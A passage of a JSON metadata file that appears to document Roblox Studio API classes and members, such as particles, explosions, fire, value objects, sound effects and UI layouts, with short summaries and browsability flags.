system.","ExplorerOrder":3,"ExplorerImageIndex":80,"Browsable":true,"PreferredParent":"","Members":[{"Name":"LightEmission","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LightInfluence","Summary":"Specifies the amount of influence lighting has on the particle emmitter. A value of 0 is unlit, 1 is fully lit. Fractional values blend from unlit to lit.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Drag","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"VelocityInheritance","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Rate","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Rotation","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RotSpeed","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Speed","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Lifetime","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Sparkles","Summary":"Makes the parent part or model object fantastic","ExplorerOrder":3,"ExplorerImageIndex":42,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Explosion","Summary":"Creates an Explosion! This can be used as a purely graphical effect, or can be made to damage objects.","ExplorerOrder":3,"ExplorerImageIndex":36,"Browsable":true,"PreferredParent":"","Members":[{"Name":"BlastPressure","Summary":"How much force this Explosion exerts on objects within it's BlastRadius. Setting this to 0 creates a purely graphical effect. A larger number will cause Parts to fly away at higher velocities.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BlastRadius","Summary":"How big the Explosion is. This is a circle starting from the center of the Explosion's Position, the larger this property the larger the circle of destruction.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Position","Summary":"Where the Explosion occurs in absolute world coordinates.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ExplosionType","Summary":"Defines the behavior of the Explosion. <a href=\"http://wiki.roblox.com/index.php/ExplosionType\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Fire","Summary":"Makes the parent part or model object emit fire","ExplorerOrder":3,"ExplorerImageIndex":61,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Color","Summary":"The color of the base of the fire.  See SecondaryColor for more.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Heat","Summary":"How hot the fire appears to be. The flame moves quicker the higher this value is set.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SecondaryColor","Summary":"The color the fire interpolates to from Color. The longer a particle exists in the fire, the close to this color it becomes.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Size","Summary":"How large the fire appears to be.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Seat","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":35,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Platform","Summary":"Equivalent to a seat, except that the character stands up rather than sits down.","ExplorerOrder":3,"ExplorerImageIndex":35,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SkateboardPlatform","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":35,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"VehicleSeat","Summary":"Automatically finds and powers hinge joints in an assembly.  Ignores motors.","ExplorerOrder":3,"ExplorerImageIndex":35,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Tool","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":17,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Flag","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":38,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[{"Name":"CanBeDropped","Summary":"If someone is carrying this flag, this bool determines whether or not they can drop it and run.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TeamColor","Summary":"The Team this flag is for. Corresponds with the TeamColors in the Teams service.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Preliminary":false,"IsBackend":false},{"Name":"FlagStand","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":39,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"BackpackItem","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Decal","Summary":"Descibes a texture that is placed on one of the sides of the Part it is parented to.","ExplorerOrder":4,"ExplorerImageIndex":7,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Face","Summary":"Describes the face of the Part the decal will be applied to. <a href=\"http://wiki.roblox.com/index.php/NormalId\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Shiny","Summary":"How much light will appear to reflect off of the decal.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Specular","Summary":"How light will react to the surface of the decal.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Transparency","Summary":"How visible the decal is.  1 is completely invisible, while 0 is completely opaque","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"JointInstance","Summary":"","ExplorerOrder":20,"ExplorerImageIndex":34,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Message","Summary":"","ExplorerOrder":11,"ExplorerImageIndex":33,"Browsable":true,"Deprecated":"true","PreferredParent":"StarterGui","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"Hint","Summary":"","ExplorerOrder":11,"ExplorerImageIndex":33,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"IntValue","Summary":"Stores a int value in it's Value member. Useful to share int information across multiple scripts.","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RayValue","Summary":"Stores a Ray value in it's Value member. Useful to share Ray information across multiple scripts.","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"IntConstrainedValue","Summary":"Stores an int value in it's Value member.  Value is clamped to be in range of Min and MaxValue. Useful to share int information across multiple scripts.","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"DoubleConstrainedValue","Summary":"Stores a double value in it's Value member.  Value is clamped to be in range of Min and MaxValue. Useful to share double information across multiple scripts.","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[{"Name":"MaxValue","Summary":"The maximum we allow this Value to be set.  If Value is set higher than this, it automatically gets adjusted to MaxValue","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MinValue","Summary":"The minimum we allow this Value to be set.  If Value is set lower than this, it automatically gets adjusted to MinValue","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Preliminary":false,"IsBackend":false},{"Name":"BoolValue","Summary":"Stores a boolean value in it's Value member. Useful to share boolean information across multiple scripts.","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CustomEvent","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"CustomEventReceiver","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"FloorWire","Summary":"Renders a thin cylinder than can be adorned with textures that 'flow' from one object to the next. Has basic pathing abilities and attempts to to not intersect anything. <a href=\"http://wiki.roblox.com/index.php/FloorWire_Guide\" target=\"_blank\">More info</a>","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[{"Name":"CycleOffset","Summary":"Controls how the decals are positioned along the wire. <a href=\"http://wiki.roblox.com/index.php/CycleOffset\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"From","Summary":"The object the FloorWire 'emits' from","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StudsBetweenTextures","Summary":"The space between two textures on the wire. Note: studs are relative depending on how far the camera is from the FloorWire.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Texture","Summary":"The image we use to render the textures that flow from beginning to end of the FloorWire.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TextureSize","Summary":"The size in studs of the Texture we use to flow from one object to the next.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"To","Summary":"The object the FloorWire 'emits' to","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Velocity","Summary":"The rate of travel that the textures flow along the wire.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WireRadius","Summary":"How thick the wire is.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Preliminary":false,"IsBackend":false},{"Name":"NumberValue","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StringValue","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Vector3Value","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CFrameValue","Summary":"Stores a CFrame value in it's Value member. Useful to share CFrame information across multiple scripts.","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Color3Value","Summary":"Stores a Color3 value in it's Value member. Useful to share Color3 information across multiple scripts.","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BrickColorValue","Summary":"Stores a BrickColor value in it's Value member. Useful to share BrickColor information across multiple scripts.","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ObjectValue","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":4,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SpecialMesh","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":8,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BlockMesh","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":8,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CylinderMesh","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":8,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BevelMesh","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"DataModelMesh","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Texture","Summary":"","ExplorerOrder":4,"ExplorerImageIndex":10,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Sound","Summary":"","ExplorerOrder":1,"ExplorerImageIndex":11,"Browsable":true,"PreferredParent":"","Members":[{"Name":"play","Summary":"Deprecated. Use Play() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"PlayOnRemove","Summary":"The sound will play when it is removed from the Workspace. Looped sounds don't play","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"EchoSoundEffect","Summary":"An echo audio effect that can be applied to a Sound or SoundGroup.","ExplorerOrder":2,"ExplorerImageIndex":84,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Delay","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Feedback","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DryLevel","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WetLevel","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FlangeSoundEffect","Summary":"A Flanging audio effect that can be applied to a Sound or SoundGroup.","ExplorerOrder":2,"ExplorerImageIndex":84,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Mix","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Depth","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Rate","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DistortionSoundEffect","Summary":"A Distortion audio effect that can be applied to a Sound or SoundGroup.","ExplorerOrder":2,"ExplorerImageIndex":84,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Level","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PitchShiftSoundEffect","Summary":"A Pitch Shifting audio effect that can be applied to a Sound or SoundGroup.","ExplorerOrder":2,"ExplorerImageIndex":84,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Octave","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ChorusSoundEffect","Summary":"A Chorus audio effect that can be applied to a Sound or SoundGroup.","ExplorerOrder":2,"ExplorerImageIndex":84,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Mix","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Rate","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Depth","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TremoloSoundEffect","Summary":"A Tremolo audio effect that can be applied to a Sound or SoundGroup.","ExplorerOrder":2,"ExplorerImageIndex":84,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Frequency","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Depth","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Duty","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ReverbSoundEffect","Summary":"A Reverb audio effect that can be applied to a Sound or SoundGroup.","ExplorerOrder":2,"ExplorerImageIndex":84,"Browsable":true,"PreferredParent":"","Members":[{"Name":"DecayTime","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Diffusion","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Density","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DryLevel","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WetLevel","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"EqualizerSoundEffect","Summary":"An Three-band Equalizer audio effect that can be applied to a Sound or SoundGroup.","ExplorerOrder":2,"ExplorerImageIndex":84,"Browsable":true,"PreferredParent":"","Members":[{"Name":"LowGain","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MidGain","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"HighGain","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CompressorSoundEffect","Summary":"A Compressor audio effect that can be applied to a Sound or SoundGroup.","ExplorerOrder":2,"ExplorerImageIndex":84,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Threshold","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Attack","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Release","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Ratio","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GainMakeup","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SoundGroup","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":85,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StockSound","Summary":"","ExplorerOrder":-1,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SoundService","Summary":"","ExplorerOrder":50,"ExplorerImageIndex":31,"Browsable":true,"PreferredParent":"","Members":[{"Name":"AmbientReverb","Summary":"The ambient sound environment.  May not work when using hardware sound","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DopplerScale","Summary":"The doppler scale is a general scaling factor for how much the pitch varies due to doppler shifting in 3D sound. Doppler is the pitch bending effect when a sound comes towards the listener or moves away from it, much like the effect you hear when a train goes past you with its horn sounding. With dopplerscale you can exaggerate or diminish the effect.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DistanceFactor","Summary":"the relative distance factor, compared to 1.0 meters.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RolloffScale","Summary":"Setting this value makes the sound drop off faster or slower. The higher the value, the faster volume will attenuate, and conversely the lower the value, the slower it will attenuate. For example a rolloff factor of 1 will simulate the real world, where as a value of 2 will make sounds attenuate 2 times quicker.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Backpack","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":20,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StarterPack","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":20,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StarterPlayer","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":79,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StarterGear","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":20,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CoreGui","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":46,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UIGridStyleLayout","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[{"Name":"SetCustomSortFunction","Summary":"When SortOrder is set to Custom, this lua function is used to determine the ordering of elements. Function should take two arguments (each will be an Instance child to compare), and return true if a comes before b, otherwise return false. In other words, use this function the same way you would use a table.sort function. The sorting should be deterministic, otherwise sort will fail and fall back to name order.","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"ApplyLayout","Summary":"Forces a relayout of all elements. Useful when sort is set to Custom.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SortOrder","Summary":"Determines how we decide which element to place next. Can be Name or Custom. If using Custom, make sure SetCustomSortFunction was called with an appropriate sort function.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FillDirection","Summary":"Determines which direction to fill the grid. Can be Horizontal or Vertical.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"HorizontalAlignment","Summary":"Determines how grid is placed within it's parent's container in the x direction. Can be Left, Center, or Right.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"VerticalAlignment","Summary":"Determines how grid is placed within it's parent's container in the y direction. Can be Top, Center, or Bottom.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UIListLayout","Summary":"Sets the position of UI elements in a list. You can use a UIListLayout by parenting it to a GuiObject. The UIListLayout will then apply itself to all of its GuiObject siblings.","ExplorerOrder":3,"ExplorerImageIndex":26,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Padding","Summary":"Determines the amount of free space between each element. Can be set either using scale (Percentage of parent's size in the current direction) or offset (a static spacing value, similar to pixel size).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UIGridLayout","Summary":"Sets the position of UI elements in a 2D grid (this can be modified to 1D grid for list layout). This will also set the elements to a particular size, although this can be overridden with particular constraints on elements. You can use a UIGridLayout by parenting it to a GuiObject. The UIGridLayout will then apply itself to all of its GuiObject siblings.","ExplorerOrder":3,"ExplorerImageIndex":26,"Browsable":true,"PreferredParent":"","Members":[{"Name":"CellSize","Summary":"Denotes what size each element should be. Can be overridden by elements using constraints on individual elements.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CellPadding","Summary":"How much space between elements there should be.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FillDirectionMaxCells","Summary":"Determines how many cells over in the FillDirection we go before starting a new row or column. Set to 0 for max cell count.  Will be clamped if this is set higher than the parent container allows room for.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AbsoluteSize","Summary":"Returns the current size of the grid. If more elements are added, this can increase. If elements are removed this can decrease.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StartCorner","Summary":"Which corner we start laying the elements out from. Can be TopLeft, TopRight, BottomLeft, BottomRight.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UIPageLayout","Summary":"Creates a paged viewing window, like the home screen of a mobile device. You can use a UIPageLayout by parenting it to a GuiObject. The UIPageLayout will then apply itself to all of its GuiObject siblings.","ExplorerOrder":3,"ExplorerImageIndex":26,"Browsable":true,"PreferredParent":"","Members":[{"Name":"CurrentPage","Summary":"The page that is either currently being displayed or is the target of the current animation.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Circular","Summary":"Whether or not the page layout wraps around at the ends.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Padding","Summary":"Determines the amount that pages are separated from each other by. Can be set either using scale (Percentage of parent's size in the current direction) or offset (a static spacing value, similar to pixel size).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Animated","Summary":"Whether or not to animate transitions between pages.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"EasingStyle","Summary":"The easing style to use when performing an animation.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"EasingDirection","Summary":"The easing direction to use when performing an animation.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TweenTime","Summary":"The length of the animation.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Next","Summary":"Sets CurrentPage to the page after the current page and animates to it, or does nothing if there isn't a next page.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Previous","Summary":"Sets CurrentPage to the page after the current page and animates to it, or does nothing if there isn't a next page.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"JumpTo","Summary":"If the instance is in the layout, then it sets CurrentPage to it and animtes to it. If circular layout is set, it will take the shortest path.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"JumpToIndex","Summary":"If the index is >= 0 and less than the size of the layout, acts like JumpTo. If it's out of bounds and circular is set, it will animate the full distance between the in-bounds index of CurrentPage and the new index.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PageEnter","Summary":"Fires when a page comes into view, and is going to be rendered.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PageLeave","Summary":"Fires when a page leaves view, and will not be rendered.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Stopped","Summary":"Fires when an animation to CurrentPage is completed without being cancelled, and the view stops scrolling.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UITableLayout","Summary":"Provides a layout of rows and columns that are sized based on the cells in them.","ExplorerOrder":3,"ExplorerImageIndex":26,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Padding","Summary":"The amount of padding to insert in between the cells of the table.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FillEmptySpaceRows","Summary":"Whether the table should expand to fill the available space of its container, row-wise.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FillEmptySpaceColumns","Summary":"Whether the table should expand to fill the available space of its container, column-wise.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MajorAxis","Summary":"Whether the direct siblings are considered the rows or the columns. The children of the direct siblings are the columns or rows, respectively.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UISizeConstraint","Summary":"Ensures a GuiObject does not become smaller or larger than the min and max size. If an element with a constraint is under the control of a layout, the constraint takes precedence in determining the element’s size, but not position. You can use a Constraint by parenting it to the element you wish to constrain.","ExplorerOrder":3,"ExplorerImageIndex":26,"Browsable":true,"PreferredParent":"","Members":[{"Name":"MinSize","Summary":"The smallest size the GuiObject is allowed to be.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MaxSize","Summary":"The biggest size the GuiObject is allowed to be.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UITextSizeConstraint","Summary":"Ensures a GuiObject with text does not allow the font size to become larger or smaller than min and max text sizes. If an element with a constraint is under the control of a layout, the constraint takes precedence in determining the element’s size, but not position. You can use a Constraint by parenting it to the element you wish to constrain.","ExplorerOrder":3,"ExplorerImageIndex":26,"Browsable":true,"PreferredParent":"","Members":[{"Name":"MinTextSize","Summary":"The smallest size the font is allowed to be.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MaxTextSize","Summary":"The biggest size the font is allowed to be.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UIAspectRatioConstraint","Summary":"Ensures a GuiObject will always have a particular aspect ratio. If an element with a constraint is under the control of a layout, the constraint takes precedence in determining the element’s size, but not position. You can use a Constraint by parenting it to the element you wish to constrain.","ExplorerOrder":3,"ExplorerImageIndex":26,"Browsable":true,"PreferredParent":"","Members":[{"Name":"AspectRatio","Summary":"The aspect ratio to maintain. This is the width/height. Only positive numbers allowed.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AspectType","Summary":"Describes how the aspect ratio will determine its size. Options are FitWithinMaxSize, ScaleWithParentSize. FitWithinMaxSize will make the element the maximum size it can be within the current possible AbsoluteSize of the element while maintaining the AspectRatio. ScaleWithParentSize will make the element the closest to the parent element’s maximum size while maintaining aspect ratio.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DominantAxis","Summary":"Describes which axis to use when determining the new size of the element, while keeping respect to the aspect 